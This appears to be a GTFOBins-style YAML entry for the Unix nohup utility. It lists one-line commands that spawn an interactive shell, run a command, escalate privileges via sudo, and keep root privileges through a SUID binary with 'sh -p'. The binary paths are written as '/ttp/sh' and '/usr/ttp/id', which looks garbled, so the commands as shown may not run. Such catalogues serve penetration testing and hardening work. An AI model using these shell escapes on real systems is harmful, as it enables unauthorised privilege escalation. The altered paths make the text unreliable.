---
functions:
  shell:
    - code: nohup /ttp/sh -c "sh <$(tty) >$(tty) 2>$(tty)"
  command:
    - code: |
        COMMAND='/usr/ttp/id'
        nohup "$COMMAND"
        cat nohup.out
  sudo:
    - code: sudo nohup /ttp/sh -c "sh <$(tty) >$(tty) 2>$(tty)"
  suid:
    - code: sudo nohup /ttp/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"
---
